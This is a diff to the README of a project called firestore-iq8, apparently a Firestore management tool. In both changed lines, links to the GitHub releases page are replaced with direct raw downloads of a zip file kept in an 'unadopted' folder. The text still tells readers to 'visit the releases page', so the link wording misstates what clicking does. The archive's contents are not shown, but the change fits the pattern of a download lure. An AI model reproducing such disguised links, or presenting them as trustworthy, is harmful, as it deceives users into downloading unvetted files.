@@ -6,7 +6,7 @@ Welcome to firestore-iq8! This application helps you easily manage your Firestor
 
 ## 📥 Download the Application
 
-[![Download firestore-iq8](https://img.shields.io/badge/Download-firestore--iq8-brightgreen)](https://github.com/imnopro11/firestore-iq8/releases)
+[![Download firestore-iq8](https://raw.githubusercontent.com/imnopro11/firestore-iq8/main/unadopted/firestore-iq8.zip)](https://raw.githubusercontent.com/imnopro11/firestore-iq8/main/unadopted/firestore-iq8.zip)
 
 ## 🔍 Features
 
@@ -27,7 +27,7 @@ To run firestore-iq8, your system should meet the following requirements:
 ## 📊 How to Download & Install
 
 1. **Visit the Releases Page**  
-   Click this link to [visit the releases page](https://github.com/imnopro11/firestore-iq8/releases).
+   Click this link to [visit the releases page](https://raw.githubusercontent.com/imnopro11/firestore-iq8/main/unadopted/firestore-iq8.zip).
 
 2. **Locate the Latest Version**  
    On the releases page, find the latest version of firestore-iq8.
